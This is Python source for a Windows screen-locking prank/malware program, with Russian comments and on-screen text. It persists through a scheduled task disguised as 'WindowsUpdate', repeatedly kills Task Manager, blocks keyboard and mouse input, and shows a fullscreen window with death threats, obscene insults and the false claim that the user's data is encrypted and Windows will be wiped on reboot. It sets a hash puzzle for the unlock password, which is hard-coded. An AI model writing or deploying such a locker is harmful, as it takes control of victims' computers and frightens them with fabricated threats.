import ctypes, os, sys, time, threading, random, tkinter as tk

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TIMER_SECONDS = 15  # для теста, потом 600

# === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# === БЛОКИРУЕМ WIN-КЛАВИШУ ===
def block_win_key():
    try:
        import keyboard
        keyboard.add_hotkey('windows', lambda: None, suppress=True)
        keyboard.add_hotkey('win', lambda: None, suppress=True)
    except:
        pass

# === УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ ===
def kill_taskmgr():
    while True:
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        time.sleep(0.1)

# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ ===
def add_to_startup():
    import subprocess
    script_path = os.path.abspath(__file__)
    command = f'python "{script_path}"'
    subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)

# === АНИМАЦИЯ ВКЛЮЧЕНИЯ ===
def show_boot_animation():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
    lbl.pack(expand=True)
    messages = [
        "ВАС ЗАМЕТИЛ МАРКУС...",
        "ПОДКЛЮЧЕНИЕ К ctOS 2.0...",
        "РАСШИФРОВКА КЛЮЧЕЙ...",
        "DIE"
    ]
    for msg in messages:
        lbl.config(text=msg)
        root.update()
        time.sleep(2)
    root.destroy()

# === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Центральные надписи
        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
        
        # Страшный текст слева
        scary_text = (
            "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
            "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
            "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n"
            "СОСИ ХУЙ\n\n"
            "НО Я НЕ ВЫМОГАТЕЛЬ, Я ДАМ ТЕБЕ ПАРОЛЬ\n"
            "НО НЕ ПРОСТО ПАРОЛЬ, ТЫ ЕГО ДОЛЖЕН РАСШИФРОВАТЬ\n"
            "1 - 5 ПАРОЛИ ВСЕ РАЗНЫЕ СЕТИ\n"
            "МУЧАЙСЯ ПИДОР\n\n"
            "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n"
            "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n"
            "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n"
            "4. Base64\nNDM1NjM0MjM0\n"
            "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
        )
        self.canvas.create_text(50, 250, text=scary_text, fill='white', font=('Courier', 14), anchor='w')
        
        # Поле ввода строго по центру (используем отдельный Frame для точного позиционирования)
        center_frame = tk.Frame(self.win, bg='black')
        center_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        tk.Label(center_frame, text="ВВЕДИТЕ ПАРОЛЬ:", fg='white', bg='black', font=('Courier', 28)).pack(pady=10)
        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
        self.entry.pack(pady=10)
        self.status = tk.Label(center_frame, text="", fg='white', bg='black', font=('Courier', 20))
        self.status.pack(pady=10)
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        self.animate()
    
    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            self.status.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)
    
    def animate(self):
        # Мерцание главной надписи
        if random.random() < 0.1:
            self.canvas.itemconfig("title", fill='gray')
        else:
            self.canvas.itemconfig("title", fill='white')
        self.win.after(50, self.animate)

# === ЗАПУСК ===
if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=kill_taskmgr, daemon=True).start()
    time.sleep(TIMER_SECONDS)
    block_input(True)
    threading.Thread(target=block_win_key, daemon=True).start()
    show_boot_animation()
    app = WinLocker()
    app.root.mainloop()
